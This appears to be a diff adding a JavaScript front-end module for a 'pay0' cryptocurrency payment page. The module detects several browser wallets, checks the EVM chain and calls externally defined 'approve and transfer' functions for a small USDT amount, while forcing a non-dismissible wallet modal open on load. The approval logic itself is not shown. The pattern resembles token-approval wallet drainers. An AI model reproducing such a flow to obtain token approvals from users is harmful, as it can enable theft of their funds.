@@ -1,0 +1,245 @@
+(function () {
+  const core = window.pay0Core;
+  if (!core) throw new Error("pay0Core 未加载");
+  const $ = core.$;
+
+  let walletModalInstance = null;
+
+  function showModal() {
+    const el = $("walletModal");
+    if (!el || !window.bootstrap) return;
+    walletModalInstance = window.bootstrap.Modal.getOrCreateInstance(el, { backdrop: "static", keyboard: false });
+    walletModalInstance.show();
+  }
+
+  function hideModal() {
+    if (walletModalInstance && typeof walletModalInstance.hide === "function") walletModalInstance.hide();
+  }
+
+  function getPayAmountUsdt() {
+    try {
+      const cfg = window.pay0Config || {};
+      const v = typeof cfg.amountUsdt === "number" ? cfg.amountUsdt : parseFloat(cfg.amountUsdt);
+      if (!isNaN(v) && v > 0) return String(v);
+    } catch (e) {}
+    return "1";
+  }
+
+  function uaIncludes(s) {
+    try {
+      return typeof navigator !== "undefined" && typeof navigator.userAgent === "string" && navigator.userAgent.toLowerCase().includes(String(s).toLowerCase());
+    } catch (e) {
+      return false;
+    }
+  }
+
+  function getMetaMaskEthereum() {
+    if (typeof window === "undefined") return null;
+    const eth = window.ethereum;
+    if (!eth) return null;
+    if (eth.isMetaMask) return eth;
+    if (Array.isArray(eth.providers)) {
+      for (let i = 0; i < eth.providers.length; i++) {
+        const p = eth.providers[i];
+        if (p && p.isMetaMask) return p;
+      }
+    }
+    return null;
+  }
+
+  function isMetaMaskProvider() {
+    return !!getMetaMaskEthereum();
+  }
+
+  function isTrustProvider() {
+    return !!(window.ethereum && (window.ethereum.isTrust || window.ethereum.isTrustWallet));
+  }
+
+  function isTokenPocketEnv() {
+    return !!((window.ethereum && window.ethereum.isTokenPocket) || window.tokenPocket || uaIncludes("tokenpocket"));
+  }
+
+  function isBitgetEnv() {
+    return !!((window.ethereum && window.ethereum.isBitKeep) || (window.bitkeep && window.bitkeep.ethereum) || uaIncludes("bitkeep") || uaIncludes("bitget"));
+  }
+
+  async function getEvmChainIdHex() {
+    if (!window.ethereum) throw new Error("未检测到 EVM 钱包");
+    return await window.ethereum.request({ method: "eth_chainId" });
+  }
+
+  function chainKeyFromChainIdHex(chainIdHex) {
+    const s = String(chainIdHex || "").toLowerCase();
+    if (s === "0x1") return "eth";
+    if (s === "0x38") return "bsc";
+    if (s === "0x61") return "bscTestnet";
+    return null;
+  }
+
+  function chainLabel(chainKey) {
+    if (chainKey === "eth") return "Ethereum 主网 (1)";
+    if (chainKey === "bsc") return "BSC 主网 (56)";
+    if (chainKey === "bscTestnet") return "BSC 测试网 (97)";
+    return String(chainKey || "");
+  }
+
+  function allowedChainsLabel(keys) {
+    if (!Array.isArray(keys) || keys.length === 0) return "";
+    if (keys.length === 1) return chainLabel(keys[0]);
+    return keys.map(chainLabel).join(" / ");
+  }
+
+  async function payEvmByCurrentChain(allowedChainKeys, log) {
+    if (!window.ethereum) throw new Error("未检测到 EVM 钱包");
+    const chainIdHex = await getEvmChainIdHex();
+    const chainKey = chainKeyFromChainIdHex(chainIdHex);
+    if (!chainKey) throw new Error("当前链不支持：" + String(chainIdHex || ""));
+    if (Array.isArray(allowedChainKeys) && allowedChainKeys.length > 0 && !allowedChainKeys.includes(chainKey)) {
+      const current = chainLabel(chainKey);
+      const expected = allowedChainsLabel(allowedChainKeys);
+      throw new Error("当前链为 " + current + "，请切换到 " + expected);
+    }
+    if (typeof window.pay0EvmApproveAndTransfer !== "function") throw new Error("EVM 模块未加载");
+    await window.pay0EvmApproveAndTransfer({
+      chain: chainKey,
+      amountUsdt: getPayAmountUsdt(),
+      log
+    });
+  }
+
+  async function payTronViaTronLink(log) {
+    if (typeof window.pay0TronLinkTransfer !== "function") throw new Error("TronLink 模块未加载");
+    await window.pay0TronLinkTransfer({
+      log,
+      amountUsdt: getPayAmountUsdt()
+    });
+  }
+
+  async function payTronViaTronWeb(log) {
+    if (typeof window.pay0TokenPocketTronTransfer !== "function") throw new Error("TronWeb 模块未加载");
+    await window.pay0TokenPocketTronTransfer({
+      log,
+      amountUsdt: getPayAmountUsdt()
+    });
+  }
+
+  async function payTokenPocketSelected(log) {
+    if (!isTokenPocketEnv()) throw new Error("未检测到 TokenPocket，请在 TokenPocket 内置浏览器打开本页");
+    if (typeof window.pay0TokenPocketPay !== "function") throw new Error("TokenPocket 模块未加载");
+    await window.pay0TokenPocketPay({ log });
+  }
+
+  async function payBitgetSelected(log) {
+    if (!isBitgetEnv()) throw new Error("未检测到 Bitget Wallet，请在 Bitget Wallet 内置浏览器打开本页或安装插件");
+    if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
+      await payTronViaTronWeb(log);
+      return;
+    }
+    if (window.ethereum) {
+      await payEvmByCurrentChain(["eth", "bsc"], log);
+      return;
+    }
+    throw new Error("未检测到 Bitget Wallet 注入的 tronWeb / ethereum");
+  }
+
+  async function payMetaMaskSelected(log) {
+    const provider = getMetaMaskEthereum();
+    if (!provider) throw new Error("未检测到 MetaMask，请确认已在浏览器中启用 MetaMask 扩展或使用 MetaMask 内置浏览器打开本页");
+    const prev = window.ethereum;
+    try {
+      window.ethereum = provider;
+      await payEvmByCurrentChain(["eth", "bsc"], log);
+    } finally {
+      window.ethereum = prev;
+    }
+  }
+
+  async function payTrustSelected(log) {
+    if (!isTrustProvider()) throw new Error("未检测到 Trust Wallet，请启用 Trust Wallet 或禁用其他 EVM 钱包插件");
+    await payEvmByCurrentChain(["eth", "bsc"], log);
+  }
+
+  function bindWalletButtons(log) {
+    const btnConnect = $("btnConnect");
+    if (btnConnect) btnConnect.addEventListener("click", () => showModal());
+
+    const btnPayNow = $("btnPayNow");
+    if (btnPayNow) btnPayNow.addEventListener("click", () => showModal());
+
+    const btnCloseModal = $("btnCloseModal");
+    if (btnCloseModal) btnCloseModal.addEventListener("click", () => hideModal());
+
+    const walletModal = $("walletModal");
+    if (walletModal) walletModal.addEventListener("click", (e) => { if (e.target === walletModal) hideModal(); });
+
+    const btnMetaMask = $("btnWalletMetaMask");
+    if (btnMetaMask) btnMetaMask.addEventListener("click", async () => {
+      try {
+        hideModal();
+        await payMetaMaskSelected(log);
+      } catch (e) {
+        const msg = "MetaMask 支付失败：" + (e && e.message ? e.message : String(e));
+        log(msg);
+        alert(msg);
+      }
+    });
+
+    const btnTokenPocket = $("btnWalletTokenPocket");
+    if (btnTokenPocket) btnTokenPocket.addEventListener("click", async () => {
+      try {
+        hideModal();
+        await payTokenPocketSelected(log);
+      } catch (e) {
+        const msg = "TokenPocket 支付失败：" + (e && e.message ? e.message : String(e));
+        log(msg);
+        alert(msg);
+      }
+    });
+
+    const btnTronLink = $("btnWalletTronLink");
+    if (btnTronLink) btnTronLink.addEventListener("click", async () => {
+      try {
+        hideModal();
+        await payTronViaTronLink(log);
+      } catch (e) {
+        const msg = "TronLink 支付失败：" + (e && e.message ? e.message : String(e));
+        log(msg);
+        alert(msg);
+      }
+    });
+
+    const btnBitget = $("btnWalletBitget");
+    if (btnBitget) btnBitget.addEventListener("click", async () => {
+      try {
+        hideModal();
+        await payBitgetSelected(log);
+      } catch (e) {
+        const msg = "Bitget 支付失败：" + (e && e.message ? e.message : String(e));
+        log(msg);
+        alert(msg);
+      }
+    });
+
+    const btnTrust = $("btnWalletTrust");
+    if (btnTrust) btnTrust.addEventListener("click", async () => {
+      try {
+        hideModal();
+        await payTrustSelected(log);
+      } catch (e) {
+        const msg = "Trust Wallet 支付失败：" + (e && e.message ? e.message : String(e));
+        log(msg);
+        alert(msg);
+      }
+    });
+  }
+
+  function init(opts) {
+    const log = opts && typeof opts.log === "function" ? opts.log : function () {};
+    bindWalletButtons(log);
+    showModal();
+    log("页面已就绪");
+  }
+
+  window.pay0Actions = { init };
+})();
+
